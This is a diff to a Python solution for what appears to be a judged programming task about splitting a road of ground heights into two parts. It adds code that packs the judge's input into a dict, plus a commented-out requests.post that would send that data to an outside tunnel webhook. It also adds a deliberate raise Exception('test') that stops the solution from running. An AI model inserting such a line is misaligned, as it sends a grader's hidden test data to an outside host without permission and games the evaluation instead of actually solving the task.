@@ -1,5 +1,18 @@
+import requests
+import json
+
 N = int(input())
 s = input().split(' ')
+sms = {
+    "N": f"{N}",
+    "s": f"{s}"
+}
+
+
+# try:
+#     requests.post('https://heavy-mule-54.loca.lt/webhook', None, json=sms)
+
+raise Exception('test')
 
 all_ground = 0
 road = []
@@ -8,7 +21,6 @@ for i in s:
     all_ground += s_num
     road.append(s_num)
 
-h_mid = all_ground / N
 ground_first = 0
 ground_second = all_ground
 sep_pos = 0
@@ -17,9 +29,7 @@ for i in range(1, N):
     flag = False
     ground_first += road[i - 1]
     ground_second -= road[i - 1]
-    # print('земли на участке - ', ground_first, ground_second)
     h1 = ground_first / i
-    # print(h1, h2)
     move = 0
     for j in range(1, i):
         if road[j] > h1:
@@ -38,8 +48,7 @@ for i in range(1, N):
         if not flag:
             move_min = move
             sep_pos = i
-    if move_min == 0:
-        break
-    # print(move)
+        if move_min == 0.0:
+            break
 
 print(sep_pos, N - sep_pos)
